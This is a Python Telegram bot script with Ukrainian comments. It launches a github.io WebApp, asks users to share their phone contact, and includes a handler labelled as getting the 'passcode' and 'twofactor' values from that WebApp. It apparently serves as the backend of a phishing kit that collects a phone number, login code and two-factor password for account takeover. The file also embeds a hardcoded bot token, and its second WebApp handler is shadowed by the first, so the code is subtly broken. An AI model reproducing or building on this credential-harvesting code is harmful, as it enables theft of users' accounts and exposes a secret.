import telebot
import json
from telebot import types

TOKEN = "8501545065:AAGgYCuf0tOj-uc74hE9YlDJJJHojbKztrA"
WEBAPP_URL = "https://fairusss.github.io/tgbot/"

bot = telebot.TeleBot(TOKEN)
# /start — показує кнопку з WebApp
@bot.message_handler(commands=['start'])
def start(message):
    markup = types.InlineKeyboardMarkup()
    markup.add(
        types.InlineKeyboardButton(
            text=":globe_with_meridians: Відкрити WebApp",
            web_app=types.WebAppInfo(url=WEBAPP_URL)
        )
    )
    bot.send_message(
        message.chat.id,
        ":wave: Привіт! Натисни, щоб відкрити WebApp:",
        reply_markup=markup
    )

@bot.message_handler(content_types=['web_app_data'])
def request_contact(message):
    try:
        data = json.loads(message.web_app_data.data)
        print("Received from WebApp:", data)

        if data.get("action") == "request_contact":
            markup = types.ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=True)
            contact_btn = types.KeyboardButton(text="", request_contact=True)
            markup.add(contact_btn)

            bot.send_message(
                message.chat.id,
                "Please tap the button below to share your contact:",
                reply_markup=markup
            )

        else:
            bot.send_message(message.chat.id, "Unknown action received.")
    except Exception as e:
        bot.send_message(message.chat.id, f"Error: {e}")

# Отримання номера телефону з WebApp
@bot.message_handler(content_types=['contact'])
def handle_webapp_data(message):
    data = message.contact.phone_number
    print(data)
    bot.send_message(message.chat.id, f":telephone_receiver: Отримано номер: {data}")

# get passcode and twofactor from webapp
@bot.message_handler(content_types=['web_app_data'])
def handle_webapp(message):
    data = json.loads(message.web_app_data.data)
    if data.get("action") == "passcode_value":
        print(data.get("passcode_value"))
    elif data.get("action") == "twofactor_value":
        print(data.get("twofactor_value"))

print(":white_check_mark: Бот запущено! Очікуємо дані...")



bot.infinity_polling()